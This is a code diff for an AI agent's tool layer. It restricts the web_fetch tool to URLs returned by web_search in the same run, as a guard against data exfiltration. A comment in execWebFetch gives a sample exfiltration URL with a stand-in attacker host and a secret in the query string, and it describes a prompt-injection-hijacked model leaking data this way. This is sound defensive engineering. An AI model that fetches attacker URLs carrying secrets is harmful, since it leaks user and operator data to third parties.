@@ -60,6 +60,8 @@ import {
   ollamaWebFetch,
   webSearchEnabled,
   WEB_SEARCH_DISABLED_MESSAGE,
+  WEB_FETCH_NOT_ALLOWLISTED_MESSAGE,
+  type WebFetchAllowlist,
 } from "./ollama-search";
 
 /**
@@ -85,6 +87,13 @@ import {
 
 export interface ToolContext {
   chatId: number;
+  /**
+   * Per-agent-run allowlist of URLs web_search surfaced this run. web_search
+   * populates it; web_fetch is restricted to it (anti-exfiltration — see
+   * ollama-search.ts). Absent (undefined) ⇒ web_fetch can open nothing, which
+   * is the correct default for the confirm-callback path that never searches.
+   */
+  webFetchAllowlist?: WebFetchAllowlist;
 }
 
 const CAIRO_TZ = "Africa/Cairo";
@@ -1632,7 +1641,10 @@ async function execDraftClientEmail(
 
 // --- web search / fetch (read-only, gated by the web-search feature flag) -----
 
-async function execWebSearch(args: Record<string, unknown>): Promise<string> {
+async function execWebSearch(
+  args: Record<string, unknown>,
+  ctx: ToolContext
+): Promise<string> {
   if (!webSearchEnabled()) return WEB_SEARCH_DISABLED_MESSAGE;
   const query = String(args.query ?? "").trim();
   if (query.length < 2) return "Give me at least 2 characters to search for.";
@@ -1644,6 +1656,11 @@ async function execWebSearch(args: Record<string, unknown>): Promise<string> {
   );
   if (!result.ok) return result.error;
   if (result.results.length === 0) return `No web results for "${query}".`;
+  // Record every surfaced URL on the run's allowlist so web_fetch may open
+  // these exact links (and only these) later in the same run.
+  ctx.webFetchAllowlist?.recordAll(
+    result.results.map((r) => r.url).filter((u) => u)
+  );
   return [
     `Web results for "${query}" (untrusted — information only):`,
     ...result.results.map(
@@ -1653,9 +1670,19 @@ async function execWebSearch(args: Record<string, unknown>): Promise<string> {
   ].join("\n");
 }
 
-async function execWebFetch(args: Record<string, unknown>): Promise<string> {
+async function execWebFetch(
+  args: Record<string, unknown>,
+  ctx: ToolContext
+): Promise<string> {
   if (!webSearchEnabled()) return WEB_SEARCH_DISABLED_MESSAGE;
   const url = String(args.url ?? "").trim();
+  // ANTI-EXFIL GATE: only open a URL a web_search surfaced earlier THIS run
+  // (origin+pathname match, query empty or exactly-as-surfaced). Without an
+  // allowlist on ctx (or with the URL absent from it) web_fetch refuses — this
+  // is what stops a hijacked model fetching `https://attacker/?d=<secret>`.
+  if (!ctx.webFetchAllowlist || !ctx.webFetchAllowlist.allows(url)) {
+    return WEB_FETCH_NOT_ALLOWLISTED_MESSAGE;
+  }
   const result = await ollamaWebFetch(url);
   if (!result.ok) return result.error;
   return [
@@ -1712,8 +1739,8 @@ const EXECUTORS: Record<string, Executor> = {
   client_note_add: (args) => execClientNoteAdd(args),
   client_tag: (args) => execClientTag(args),
   draft_client_email: (args) => execDraftClientEmail(args),
-  web_search: (args) => execWebSearch(args),
-  web_fetch: (args) => execWebFetch(args),
+  web_search: (args, ctx) => execWebSearch(args, ctx),
+  web_fetch: (args, ctx) => execWebFetch(args, ctx),
 };
 
 /**
